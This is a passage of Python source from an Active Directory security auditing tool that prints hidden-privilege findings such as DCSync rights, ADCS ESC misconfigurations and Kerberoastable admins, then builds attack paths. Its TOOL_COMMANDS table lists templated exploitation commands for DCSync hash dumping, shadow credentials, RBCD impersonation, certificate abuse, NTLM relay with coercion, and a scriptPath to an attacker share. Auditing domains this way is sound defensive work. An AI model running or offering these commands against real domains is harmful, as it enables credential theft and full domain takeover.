            sev_col = Fore.RED if r.get("severity") == "CRITICAL" else Fore.LIGHTYELLOW_EX
            print(f"    {sev_col}{r['sam']}{Style.RESET_ALL}  [{r['type']}]")
            print(f"       Allowed  : {', '.join(r.get('allowed_names',[])[:5])}")
            if r.get("suspicious_principals"):
                print(f"       {Fore.RED}⚠ Suspicious (non-machine) principals: "
                      f"{', '.join(r['suspicious_principals'][:3])}{Style.RESET_ALL}")
            print(f"       Changed  : {r.get('when_changed','?')}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    upg = findings.get("unusual_primary_group", [])
    if upg:
        total_issues += len(upg)
        _finding_header("Unusual primaryGroupID (PAC Manipulation)", len(upg), "HIGH")
        for r in upg:
            col = Fore.RED if r.get("severity") == "CRITICAL" else Fore.LIGHTYELLOW_EX
            dis = f"  {Fore.RED}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
            print(f"    {col}{r['sam']}{Style.RESET_ALL}  primaryGroupID={r['primary_group_id']}{dis}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                           
    sp = findings.get("scriptpath_set", [])
    if sp:
        total_issues += len(sp)
        _finding_header("scriptPath / loginScript Set on Accounts", len(sp), "HIGH")
        for r in sp:
            col  = _sev_color(r.get("severity","MEDIUM"))
            icon = _sev_icon(r.get("severity","MEDIUM"))
            unc  = f"  {Fore.RED}[UNC-PATH]{Style.RESET_ALL}" if r.get("is_unc") else ""
            priv = f"  {Fore.RED}[PRIVILEGED]{Style.RESET_ALL}" if r.get("is_privileged") else ""
            dis  = f"  {Fore.LIGHTBLACK_EX}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
            print(f"    {icon} {col}{r['sam']}{Style.RESET_ALL}{unc}{priv}{dis}")
            print(f"       Script   : {Fore.YELLOW}{r.get('script_path','')}{Style.RESET_ALL}")
            print(f"       Changed  : {r.get('when_changed','?')}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                           
    altsec = findings.get("alt_sec_ids_set", [])
    if altsec:
        total_issues += len(altsec)
        _finding_header("altSecurityIdentities Set (Cert Auth Mapping)", len(altsec), "HIGH")
        for r in altsec:
            col = Fore.RED if r.get("severity") == "CRITICAL" else Fore.LIGHTYELLOW_EX
            print(f"    {col}{r['sam']}{Style.RESET_ALL}  adminCount={r.get('admin_count',0)}")
            for asi in r.get("alt_sec_ids", [])[:3]:
                print(f"       → {Fore.YELLOW}{asi}{Style.RESET_ALL}")
            print(f"       Changed  : {r.get('when_changed','?')}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    dcs = findings.get("dcsync_outside_da", [])
    if dcs:
        total_issues += len(dcs)
        _finding_header("DCSync Rights Outside Domain Admins", len(dcs), "CRITICAL")
        for r in dcs:
            inh = f"  {Fore.LIGHTBLACK_EX}[inherited]{Style.RESET_ALL}" if r.get("inherited") else ""
            print(f"    {Fore.RED}{r['trustee_name']}{Style.RESET_ALL}  ({r['trustee_sid']}){inh}")
            print(f"       Right    : {r['right']}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                           
    drw = findings.get("domain_root_writedacl", [])
    if drw:
        total_issues += len(drw)
        _finding_header("WriteDacl/WriteOwner on Domain NC Root", len(drw), "CRITICAL")
        for r in drw:
            print(f"    {Fore.RED}{r['trustee_name']}{Style.RESET_ALL}  →  {r['right']}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    dro = findings.get("domain_root_owner", {})
    if dro.get("is_suspicious"):
        total_issues += 1
        _finding_header("Non-Standard Domain NC Root Owner", 1, "CRITICAL")
        print(f"    Owner: {Fore.RED}{dro['owner_name']}{Style.RESET_ALL}  ({dro['owner_sid']})")
        print(f"    {Fore.LIGHTBLACK_EX}{dro['finding']}{Style.RESET_ALL}")
        print()

                                                                            
    sdho = findings.get("adminsdholder_owner", {})
    if sdho.get("is_suspicious"):
        total_issues += 1
        _finding_header("Non-Standard AdminSDHolder Owner", 1, "CRITICAL")
        print(f"    Owner: {Fore.RED}{sdho['owner_name']}{Style.RESET_ALL}  ({sdho['owner_sid']})")
        print(f"    {Fore.LIGHTBLACK_EX}{sdho['finding']}{Style.RESET_ALL}")
        print()

                                                                            
    sdh_aces = findings.get("adminsdholder_dangerous_aces", [])
    if sdh_aces:
        total_issues += len(sdh_aces)
        _finding_header("AdminSDHolder Dangerous ACEs (→ ALL Protected Accounts)", len(sdh_aces), "CRITICAL")
        for r in sdh_aces:
            print(f"    {Fore.RED}{r['trustee_name']}{Style.RESET_ALL}  →  {r['right']}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    ou_acls = findings.get("ou_dangerous_acls", [])
    if ou_acls:
        total_issues += len(ou_acls)
        _finding_header("Dangerous ACLs on OU Objects", len(ou_acls), "HIGH")
        for r in ou_acls:
            col = _sev_color(r.get("severity","HIGH"))
            print(f"    {col}{r['trustee_name']}{Style.RESET_ALL}  →  {r['right']}  on  {Fore.YELLOW}{r['ou_dn']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    ou_inh = findings.get("ou_inh_disabled", [])
    if ou_inh:
        total_issues += len(ou_inh)
        _finding_header("ACL Inheritance Disabled on OUs", len(ou_inh), "MEDIUM")
        for r in ou_inh:
            print(f"    {Fore.YELLOW}{r['dn']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    ou_own = findings.get("ou_nonstandard_owners", [])
    if ou_own:
        total_issues += len(ou_own)
        _finding_header("Non-Standard OU Owners", len(ou_own), "HIGH")
        for r in ou_own:
            print(f"    {Fore.LIGHTYELLOW_EX}{r['owner_name']}{Style.RESET_ALL}  →  {Fore.YELLOW}{r['dn']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    gpo_acls = findings.get("gpo_dangerous_acls", [])
    if gpo_acls:
        total_issues += len(gpo_acls)
        _finding_header("Dangerous ACLs on GPO Objects", len(gpo_acls), "HIGH")
        for r in gpo_acls:
            print(f"    {Fore.LIGHTYELLOW_EX}{r['trustee_name']}{Style.RESET_ALL}  →  {r['right']}  on  '{Fore.YELLOW}{r['gpo_name']}{Style.RESET_ALL}'")
            if r.get("gpo_path"):
                print(f"       SYSVOL: {Fore.LIGHTBLACK_EX}{r['gpo_path']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    gpo_own = findings.get("gpo_nonstandard_owners", [])
    if gpo_own:
        total_issues += len(gpo_own)
        _finding_header("Non-Standard GPO Owners", len(gpo_own), "HIGH")
        for r in gpo_own:
            print(f"    {Fore.LIGHTYELLOW_EX}{r['owner_name']}{Style.RESET_ALL}  →  '{Fore.YELLOW}{r['gpo_name']}{Style.RESET_ALL}'")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                           
    del_users = findings.get("delegation_users", [])
    if del_users:
        total_issues += len(del_users)
        _finding_header("TRUSTED_FOR_DELEGATION User Accounts", len(del_users), "HIGH")
        for r in del_users:
            col = Fore.RED if r.get("severity") == "CRITICAL" else Fore.LIGHTYELLOW_EX
            dis = f"  {Fore.LIGHTBLACK_EX}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
            priv = f"  {Fore.RED}[PRIVILEGED]{Style.RESET_ALL}" if r.get("admin_count",0) == 1 else ""
            print(f"    {col}{r['sam']}{Style.RESET_ALL}{dis}{priv}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    kda = findings.get("kerberoastable_da", [])
    if kda:
        total_issues += len(kda)
        _finding_header("Kerberoastable Domain Admin Accounts", len(kda), "CRITICAL")
        for r in kda:
            print(f"    {Fore.RED}{r['sam']}{Style.RESET_ALL}")
            print(f"       SPNs     : {', '.join(r.get('spns',[]))}")
            print(f"       Groups   : {', '.join(r.get('member_of',[]))}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    oac = findings.get("orphaned_admin_count", [])
    if oac:
        total_issues += len(oac)
        _finding_header("Orphaned adminCount=1 Accounts", len(oac), "HIGH")
        for r in oac:
            print(f"    {Fore.LIGHTYELLOW_EX}{r['sam']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    pw = findings.get("pre_win2000_members", [])
    if pw:
        total_issues += len(pw)
        _finding_header("Pre-Windows 2000 Compatible Access Members", len(pw), "CRITICAL")
        for r in pw:
            col  = Fore.RED if r.get("high_risk") else Fore.YELLOW
            print(f"    {col}{r['member_cn']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    pnr = findings.get("passwd_notreqd_enabled", [])
    if pnr:
        total_issues += len(pnr)
        _finding_header("PASSWD_NOTREQD Active Accounts", len(pnr), "HIGH")
        for r in pnr:
            col  = Fore.RED if r.get("admin_count",0)==1 else Fore.LIGHTYELLOW_EX
            print(f"    {col}{r['sam']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                           
    asp = findings.get("asrep_priv_accounts", [])
    if asp:
        total_issues += len(asp)
        _finding_header("ASREP-Roastable Privileged Accounts", len(asp), "CRITICAL")
        for r in asp:
            print(f"    {Fore.RED}{r['sam']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    maq = findings.get("machine_account_quota", {})
    if maq.get("quota", 0) > 0:
        total_issues += 1
        _finding_header("MachineAccountQuota > 0", 1, "HIGH")
        print(f"    Quota: {Fore.YELLOW}{maq['quota']}{Style.RESET_ALL}")
        print(f"    {Fore.LIGHTBLACK_EX}{maq['finding']}{Style.RESET_ALL}")
        print()

                                                                            
    dna = findings.get("dns_admins_members", [])
    if dna:
        total_issues += len(dna)
        _finding_header("DnsAdmins Members (DLL Injection Risk)", len(dna), "HIGH")
        for r in dna:
            dis = f"  {Fore.LIGHTBLACK_EX}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
            print(f"    {Fore.LIGHTYELLOW_EX}{r['sam']}{Style.RESET_ALL}  [{r['type']}]{dis}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    sea = findings.get("unexpected_schema_ea", {})
    for key, label in (("schema_admins","Unexpected Schema Admins Members"),
                       ("enterprise_admins","Unexpected Enterprise Admins Members")):
        items = sea.get(key, [])
        if items:
            total_issues += len(items)
            _finding_header(label, len(items), "CRITICAL")
            for r in items:
                dis = f"  {Fore.RED}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
                print(f"    {Fore.RED}{r['sam']}{Style.RESET_ALL}  [{r['type']}]{dis}")
                print(f"    {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
                print()

                                                                           
    esc1 = findings.get("adcs_esc1", [])
    if esc1:
        total_issues += len(esc1)
        _finding_header("ADCS ESC1 — Enrollee Supplies SAN", len(esc1), "CRITICAL")
        for r in esc1:
            print(f"    {Fore.RED}Template: {r['template_name']}{Style.RESET_ALL}")
            print(f"       Enrollee : {r['enrollee_name']}")
            print(f"       EKUs     : {', '.join(r.get('ekus',[]))}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

    esc4 = findings.get("adcs_esc4", [])
    if esc4:
        total_issues += len(esc4)
        _finding_header("ADCS ESC4 — Low-Priv Write on Template ACL", len(esc4), "HIGH")
        for r in esc4:
            print(f"    {Fore.LIGHTYELLOW_EX}{r['trustee_name']}{Style.RESET_ALL}  →  {r['rights']}  on  '{Fore.YELLOW}{r['template_name']}{Style.RESET_ALL}'")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

    esc6 = findings.get("adcs_esc6", [])
    if esc6:
        total_issues += len(esc6)
        _finding_header("ADCS ESC6 — CA EDITF_ATTRIBUTESUBJECTALTNAME2", len(esc6), "CRITICAL")
        for r in esc6:
            print(f"    {Fore.RED}{r['ca_name']}{Style.RESET_ALL}")
            print(f"    {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

    esc2 = findings.get("adcs_esc2", [])
    if esc2:
        total_issues += len(esc2)
        _finding_header("ADCS ESC2 — Any Purpose / No EKU Template", len(esc2), "CRITICAL")
        for r in esc2:
            print(f"    {Fore.RED}Template: {r['template_name']}{Style.RESET_ALL}")
            print(f"       Enrollee : {r['enrollee_name']}")
            print(f"       EKUs     : {', '.join(r.get('ekus',[])) or 'NONE (any purpose)'}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

    esc3 = findings.get("adcs_esc3", [])
    if esc3:
        total_issues += len(esc3)
        _finding_header("ADCS ESC3 — Enrollment Agent Template", len(esc3), "CRITICAL")
        for r in esc3:
            print(f"    {Fore.RED}Template: {r['template_name']}{Style.RESET_ALL}")
            print(f"       Enrollee : {r['enrollee_name']}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

    esc7 = findings.get("adcs_esc7", [])
    if esc7:
        total_issues += len(esc7)
        _finding_header("ADCS ESC7 — ManageCA / ManageCertificates by Low-Priv", len(esc7), "HIGH")
        for r in esc7:
            print(f"    {Fore.LIGHTYELLOW_EX}{r['trustee_name']}{Style.RESET_ALL}  →  {r['rights']}  on  '{Fore.YELLOW}{r['ca_name']}{Style.RESET_ALL}'")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

    esc8 = findings.get("adcs_esc8", [])
    if esc8:
        total_issues += len(esc8)
        _finding_header("ADCS ESC8 — HTTP Enrollment Endpoint (NTLM Relay Risk)", len(esc8), "HIGH")
        for r in esc8:
            print(f"    {Fore.LIGHTYELLOW_EX}{r['ca_name']}{Style.RESET_ALL}")
            print(f"    {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    usp = findings.get("userparams_suspicious", [])
    if usp:
        total_issues += len(usp)
        _finding_header("Suspicious userParameters (Embedded Scripts)", len(usp), "MEDIUM")
        for r in usp:
            col  = Fore.RED if r.get("admin_count",0)==1 else Fore.YELLOW
            dis  = f"  {Fore.LIGHTBLACK_EX}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
            print(f"    {col}{r['sam']}{Style.RESET_ALL}{dis}")
            print(f"       Indicators: {', '.join(r.get('indicators',[]))}")
            print(f"       Changed   : {r.get('when_changed','?')}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    ifp = findings.get("info_field_passwords", [])
    if ifp:
        total_issues += len(ifp)
        _finding_header("Credentials in LDAP Info/Description Fields", len(ifp), "CRITICAL")
        for r in ifp:
            col = Fore.RED if r.get("severity") == "CRITICAL" else Fore.LIGHTYELLOW_EX
            dis = f"  {Fore.LIGHTBLACK_EX}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
            print(f"    {col}{r['sam']}{Style.RESET_ALL}  [{r['type']}]{dis}")
            print(f"       Field   : {Fore.YELLOW}{r['field']}{Style.RESET_ALL}")
            print(f"       Value   : {Fore.RED}{r['value'][:100]}{Style.RESET_ALL}")
            print(f"       Match   : {', '.join(r.get('matches',[]))}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                             
    wsp = findings.get("write_scriptpath_aces", [])
    if wsp:
        total_issues += len(wsp)
        _finding_header("ACE-Level WriteScriptPath on User Accounts", len(wsp), "HIGH")
        for r in wsp:
            col  = Fore.RED if r.get("target_is_priv") else Fore.LIGHTYELLOW_EX
            dis  = f"  {Fore.LIGHTBLACK_EX}[TARGET DISABLED]{Style.RESET_ALL}" if r.get("target_disabled") else ""
            inh  = f"  {Fore.LIGHTBLACK_EX}[inherited]{Style.RESET_ALL}" if r.get("inherited") else ""
            priv = f"  {Fore.RED}[PRIV TARGET]{Style.RESET_ALL}" if r.get("target_is_priv") else ""
            print(f"    {col}{r['trustee_name']}{Style.RESET_ALL}  →  {r['right']}  →  {Fore.YELLOW}{r['target_sam']}{Style.RESET_ALL}{priv}{dis}{inh}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    pga = findings.get("privileged_group_acls", [])
    if pga:
        total_issues += len(pga)
        _finding_header("Dangerous ACLs on Privileged Groups", len(pga), "CRITICAL")
        for r in pga:
            print(f"    {Fore.RED}{r['trustee_name']}{Style.RESET_ALL}  →  {r['right']}  on  '{Fore.YELLOW}{r['group']}{Style.RESET_ALL}'")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    kpa = findings.get("krbtgt_password_age", {})
    if kpa.get("severity") in ("CRITICAL","HIGH"):
        total_issues += 1
        _finding_header("krbtgt Password Stale", 1, kpa["severity"])
        col = Fore.RED if kpa["severity"] == "CRITICAL" else Fore.LIGHTYELLOW_EX
        print(f"    {col}Age: {kpa.get('days','?')} days{Style.RESET_ALL}  (last set: {kpa.get('last_set','?')})")
        print(f"    {Fore.LIGHTBLACK_EX}{kpa['finding']}{Style.RESET_ALL}")
        print()

                                                                            
    cts = findings.get("cleartext_password_storage", [])
    if cts:
        total_issues += len(cts)
        _finding_header("Cleartext Password Storage Enabled (UAC 0x80)", len(cts), "HIGH")
        for r in cts:
            col = Fore.RED if r.get("admin_count",0)==1 else Fore.LIGHTYELLOW_EX
            print(f"    {col}{r['sam']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    dpu = findings.get("da_not_protected_users", [])
    if dpu:
        total_issues += len(dpu)
        _finding_header("Domain Admins NOT in Protected Users Group", len(dpu), "HIGH")
        for r in dpu:
            dis = f"  {Fore.LIGHTBLACK_EX}[DISABLED]{Style.RESET_ALL}" if r.get("disabled") else ""
            print(f"    {Fore.LIGHTYELLOW_EX}{r['sam']}{Style.RESET_ALL}{dis}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    cnt_acls = findings.get("container_dangerous_acls", [])
    if cnt_acls:
        total_issues += len(cnt_acls)
        _finding_header("Dangerous ACLs on Built-in Containers", len(cnt_acls), "HIGH")
        for r in cnt_acls:
            print(f"    {Fore.LIGHTYELLOW_EX}{r['trustee_name']}{Style.RESET_ALL}  →  {r['right']}  on  {Fore.YELLOW}{r['container']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                           
    wlaps = findings.get("windows_laps_acl", [])
    if wlaps:
        total_issues += len(wlaps)
        _finding_header("Windows LAPS Password Readable by Non-Admins", len(wlaps), "HIGH")
        for r in wlaps:
            print(f"    {Fore.LIGHTYELLOW_EX}{r['trustee_name']}{Style.RESET_ALL}  →  {Fore.YELLOW}{r['computer']}{Style.RESET_ALL}")
            print(f"       {Fore.LIGHTBLACK_EX}{r['finding']}{Style.RESET_ALL}")
            print()

                                                                            
    print(f"\n{_hr()}")
    if total_issues == 0:
        print(f"  {Fore.GREEN}✔ No hidden privilege findings detected.{Style.RESET_ALL}")
    else:
        print(f"  {Fore.RED}Total: {total_issues} hidden privilege finding(s) detected.{Style.RESET_ALL}")
    print(f"{_hr()}\n")



                                                                                
                                                                    
                                                                                

                                                              
EXPLOIT_DIFFICULTY = {
    "GenericAll":                          1,
    "AddMember":                           1,
    "ForceChangePassword":                 1,
    "DS-Replication-Get-Changes-All":      1,
    "MigrateSIDHistory":                   1,
    "WriteDacl":                           2,
    "WriteOwner":                          2,
    "GenericWrite":                        2,
    "WriteAllProperties":                  2,
    "ShadowCredentials":                   2,
    "WriteScriptPath":                     2,
    "WriteLoginScript":                    2,
    "WriteAltSecurityIdentities":          2,
    "WriteUserAccountControl":             2,
    "WriteSAMAccountName":                 2,
    "AllExtendedRights":                   2,
    "WriteUserParams":                     2,
    "WriteGPLink":                         3,
    "SetPrimaryGroup":                     3,
    "SetRBCD":                             3,
    "WriteSPN":                            3,
    "WriteAllowedToDelegateTo":            3,
    "WriteProperty":                       3,
    "DS-Replication-Get-Changes":          3,
    "WriteSupportedEncTypes":              3,
                   
    "Kerberoast":                          3,
    "ASREP":                               2,
    "ADCS_ESC1":                           2,
    "ADCS_ESC6":                           2,
    "ADCS_ESC8":                           3,
    "ADCS_ESC4":                           3,
    "CredentialExposure":                  1,
    "SIDHistoryInject":                    2,
    "UnconstrainedDelegation":             3,
    "ConstrainedDelegation":               3,
}

                                                                 
FULL_COMPROMISE_RIGHTS = {
    "GenericAll", "ForceChangePassword", "ShadowCredentials",
    "GenericWrite", "WriteAllProperties", "WriteDacl", "WriteOwner",
    "WriteScriptPath", "WriteLoginScript", "WriteUserAccountControl",
    "WriteAltSecurityIdentities", "WriteSAMAccountName",
    "AddMember",             
}

                                                          
GROUP_ADD_RIGHTS = {"GenericAll", "AddMember", "WriteDacl", "WriteOwner",
                    "GenericWrite", "WriteAllProperties", "Self"}

                                    
TOOL_COMMANDS = {
    "GenericAll": [
        "# Add self to target group:",
        "net group \"{target}\" {attacker} /add /domain",
        "# Or: force password change on target user:",
        "net user {target} NewP@ss123! /domain",
    ],
    "AddMember": [
        "net group \"{target}\" {attacker} /add /domain",
        "# PowerShell: Add-ADGroupMember -Identity '{target}' -Members '{attacker}'",
    ],
    "ForceChangePassword": [
        "net user {target} NewP@ss123! /domain",
        "# PowerShell: Set-ADAccountPassword -Identity {target} -Reset -NewPassword (ConvertTo-SecureString 'NewP@ss123!' -AsPlainText -Force)",
        "# Impacket: rpcclient -U 'domain/{attacker}%password' //<DC_IP> -c 'setuserinfo2 {target} 23 NewP@ss123!'",
    ],
    "ShadowCredentials": [
        "# Add shadow key credential:",
        "pywhisker add -d {domain} -u {attacker} -p '{attacker_pass}' --dc-ip {dc_ip} -t {target}",
        "# Then get NT hash via PKINIT:",
        "gettgtpkinit.py -cert-pfx {target}.pfx -pfx-pass <password> {domain}/{target} {target}.ccache",
        "getnthash.py -key <AS-REP key> {domain}/{target}",
    ],
    "WriteDacl": [
        "# Grant yourself GenericAll on the target:",
        "dacledit.py -action write -rights FullControl -principal {attacker} -target-dn '{target_dn}' '{domain}/{attacker}:{attacker_pass}' -dc-ip {dc_ip}",
        "# Then exploit GenericAll normally.",
    ],
    "WriteOwner": [
        "# Take ownership then grant rights:",
        "owneredit.py -action write -new-owner {attacker} -target-dn '{target_dn}' '{domain}/{attacker}:{attacker_pass}' -dc-ip {dc_ip}",
        "dacledit.py -action write -rights FullControl -principal {attacker} -target-dn '{target_dn}' '{domain}/{attacker}:{attacker_pass}' -dc-ip {dc_ip}",
    ],
    "GenericWrite": [
        "# Option 1 — Shadow Credentials:",
        "pywhisker add -d {domain} -u {attacker} -p '{attacker_pass}' --dc-ip {dc_ip} -t {target}",
        "# Option 2 — Write SPN then Kerberoast:",
        "python targetedKerberoast.py -d {domain} -u {attacker} -p '{attacker_pass}' --dc-ip {dc_ip} -v",
        "# Option 3 — Set scriptPath for code exec on next logon:",
        "ldapmodify: scriptPath -> \\\\<attacker_share>\\evil.bat",
    ],
    "WriteScriptPath": [
        "# Set scriptPath to attacker-controlled UNC:",
        "python3 -c \"import ldap3; c=ldap3.Connection(...); c.modify('{target_dn}',{'scriptPath':[('MODIFY_REPLACE',['\\\\\\\\<attacker_ip>\\\\share\\\\evil.bat'])]})\"",
        "# Set up SMB share on attacker machine, wait for target logon.",
        "# evil.bat: net localgroup administrators {attacker} /add",
    ],
    "DS-Replication-Get-Changes-All": [
        "# Full DCSync — extract all hashes:",
        "secretsdump.py '{domain}/{attacker}:{attacker_pass}@{dc_ip}'",
        "# Or: mimikatz 'lsadump::dcsync /domain:{domain} /all /csv'",
    ],
    "Kerberoast": [
        "# Request TGS and crack offline:",
        "GetUserSPNs.py '{domain}/{attacker}:{attacker_pass}' -dc-ip {dc_ip} -request -outputfile {target}_tgs.hash",
        "hashcat -m 13100 {target}_tgs.hash /usr/share/wordlists/rockyou.txt",
    ],
    "ASREP": [
        "# Get AS-REP and crack offline:",
        "GetNPUsers.py '{domain}/{target}' -no-pass -dc-ip {dc_ip} -format hashcat -outputfile {target}_asrep.hash",
        "hashcat -m 18200 {target}_asrep.hash /usr/share/wordlists/rockyou.txt",
    ],
    "SetRBCD": [
        "# 1. Create/use a machine account:",
        "addcomputer.py -computer-name 'ATTACKER$' -computer-pass 'Password123!' '{domain}/{attacker}:{attacker_pass}' -dc-ip {dc_ip}",
        "# 2. Set RBCD on target computer:",
        "rbcd.py -delegate-from 'ATTACKER$' -delegate-to '{target}' -action write '{domain}/{attacker}:{attacker_pass}' -dc-ip {dc_ip}",
        "# 3. Impersonate Domain Admin to target:",
        "getST.py -spn cifs/{target}.{domain} -impersonate Administrator -dc-ip {dc_ip} '{domain}/ATTACKER$:Password123!'",
        "export KRB5CCNAME=Administrator.ccache",
        "secretsdump.py -k -no-pass {domain}/Administrator@{target}.{domain}",
    ],
    "ADCS_ESC1": [
        "# Request certificate as Domain Admin:",
        "certipy req -u '{attacker}@{domain}' -p '{attacker_pass}' -dc-ip {dc_ip} -target {ca_server} -ca '{ca_name}' -template '{template}' -upn 'administrator@{domain}'",
        "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}",
    ],
    "ADCS_ESC6": [
        "# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 — exploit any enrollable template:",
        "certipy req -u '{attacker}@{domain}' -p '{attacker_pass}' -dc-ip {dc_ip} -target {ca_server} -ca '{ca_name}' -template 'User' -upn 'administrator@{domain}'",
        "certipy auth -pfx administrator.pfx -dc-ip {dc_ip}",
    ],
    "ADCS_ESC8": [
        "# Relay DC machine account to AD CS HTTP endpoint:",
        "ntlmrelayx.py -t http://{ca_server}/certsrv/mscep/mscep.dll --adcs --template DomainController",
        "# In another terminal, coerce DC to authenticate:",
        "printerbug.py '{domain}/{attacker}:{attacker_pass}' {dc_ip} {attacker_ip}",
        "# Then use obtained certificate:",
        "gettgtpkinit.py -cert-pfx dc.pfx {domain}/$(hostname)$ dc.ccache",
        "secretsdump.py -k -no-pass {domain}/$(hostname)$@{dc_ip}",
    ],
    "CredentialExposure": [
        "# Credentials found in LDAP attribute — authenticate directly:",
        "crackmapexec smb {dc_ip} -u '{target}' -p '<found_password>'",
        "# Or: secretsdump.py '{domain}/{target}:<found_password>@{dc_ip}'",
    ],
    "UnconstrainedDelegation": [
        "# Coerce DC authentication to the delegation machine:",
        "printerbug.py '{domain}/{attacker}:{attacker_pass}' {dc_ip} {target_hostname}",
        "# On the delegation machine, extract TGT from LSASS:",
        "mimikatz 'privilege::debug' 'sekurlsa::tickets /export' 'exit'",
        "# Or use Rubeus on the machine:",
        "Rubeus.exe monitor /interval:5 /nowrap",
        "# Inject the captured TGT:",
        "Rubeus.exe ptt /ticket:<base64_ticket>",
    ],
    "WriteGPLink": [
        "# Link attacker-controlled GPO to target OU:",
        "# First create malicious GPO, then link it:",
        "python3 pygpoabuse.py -dc-ip {dc_ip} -d {domain} -u {attacker} -p '{attacker_pass}' -gpo-id <gpo_id> -command 'net localgroup administrators {attacker} /add'",
    ],
}


@dataclass
class AttackStep:
    
    actor_sam:     str
    actor_sid:     str
    target_sam:    str
    target_dn:     str
    target_sid:    str
    target_type:   str                               
    right:         str
    difficulty:    int
    technique:     str
    tools:         list = field(default_factory=list)
    extra_context: str = ""


@dataclass
class AttackPath:
    
    steps:          list
    total_hops:     int
    max_difficulty: int
    avg_difficulty: float
    confidence:     float            
    path_type:      str                                                                             
    summary:        str
    final_target:   str                              


def _get_da_targets(conn, domain_dn: str, domain_sid: str) -> tuple[set, set, dict]:
    
    da_member_sids: set[str] = set()
    da_target_dns:  set[str] = set()
    da_member_info: dict     = {}

                         
    priv_group_names = [
        "Domain Admins", "Enterprise Admins", "Administrators",
        "Schema Admins", "Group Policy Creator Owners",
    ]
    for grp_name in priv_group_names:
        try:
            conn.search(domain_dn, f"(sAMAccountName={grp_name})",
                        SUBTREE, attributes=["objectSid","distinguishedName","member"])
            if not conn.entries:
                continue
            e      = conn.entries[0]
            grp_dn = str(e["distinguishedName"].value or "")
            if grp_dn:
                da_target_dns.add(grp_dn.lower())
                                    
            for mdn in listify(e["member"].values):
                mdn_str = str(mdn)
                da_target_dns.add(mdn_str.lower())
                try:
                    conn.search(mdn_str, "(objectClass=*)", BASE,
                                attributes=["objectSid","sAMAccountName","userAccountControl",
                                            "servicePrincipalName"])
                    if conn.entries:
                        me  = conn.entries[0]
                        sid = sid_to_str(me["objectSid"].raw_values[0]) if me["objectSid"].raw_values else ""
                        sam = str(me["sAMAccountName"].value or "")
                        uac = int(me["userAccountControl"].value or 0) if me["userAccountControl"].value else 0
                        spns = [str(s) for s in listify(me["servicePrincipalName"].values)]
                        if sid:
                            da_member_sids.add(sid)
                            da_member_info[sam] = {
